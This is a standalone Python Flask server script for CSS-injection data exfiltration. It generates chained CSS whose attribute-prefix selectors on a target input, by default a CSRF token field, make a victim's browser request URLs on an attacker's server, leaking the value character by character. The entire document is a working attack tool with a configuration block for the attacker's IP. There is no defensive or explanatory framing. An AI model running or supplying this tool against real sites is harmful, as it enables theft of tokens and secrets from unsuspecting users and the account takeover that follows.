# Script use for css exfiltration
from flask import Flask, request
import string
import datetime
import time

app = Flask(__name__)

startbalise = 'html:has('
endbalise = ')'

######### CHANGE BY YOUR IP AND THE BALISE TO EXFILTRATE (ONLY ONE BALISE) ###########
attacker_url = 'http://<IP>:5001'
target_balise = 'input[type="text"][name="csrf"]'
size_of_field_to_brute = 100
entry_point = '/start'
######################################################################################


balise =  startbalise + target_balise
all_data =''


def generate_css(balise, data):
    app.logger.info(f"[-] Generate css with data: {data} ...")
    z = len(data) + 1
    css = ''
    now = datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')  # Timestamp unique
    css += f'@import "{attacker_url}/launch/data?v={z}-{now}";\n\n'
    startcommand = f"{balise}"
    alphabet = string.ascii_letters + string.digits + string.punctuation
    for i in range(0, len(alphabet)):
        brute = f"{data}{alphabet[i]}"
        css += f"{startcommand}[value^='{brute}']{endbalise}\n{{\n\t--value-{z}: url('{attacker_url}/extract/{brute}?v={z}');\n}}\n\n"
    return css


@app.route(entry_point, methods=['GET'])
def index():
    app.logger.info("[+] New exfiltration started")
    css = f'@import "{attacker_url}/extract/start";\n'
    all_variable = ''
    for i in range(1, size_of_field_to_brute):
        all_variable += f' var(--value-{i},none),'
    css += f"\ninput{{\n\tbackground: {all_variable[:-1]} ;\n}}"
    return css, 200, {'Content-Type': 'text/css'}


@app.route('/extract/<data>', methods=['GET'])
def css(data):
    global all_data 
    app.logger.info(f"[+] New data recieved: {data}")
    if data == "start":
        data = ''
        all_data = ''
        css = generate_css(balise, data)
        return css, 200, {'Content-Type': 'text/css'}
    if len(all_data) <= len(data):
        all_data = data
    # img_data = open('img.jpeg', 'rb').read()
    img_data = ""
    return img_data, 200, {'Content-Type': 'image/jpeg'}


@app.route('/launch/<data>', methods=['GET'])
def launch(data):
    global all_data  # Declare the global variable
    # read file in folder
    css = generate_css(balise, all_data)
    return css, 200, {'Content-Type': 'text/css'}

        

if __name__=='__main__':
    app.run(host="0.0.0.0", port=5000)
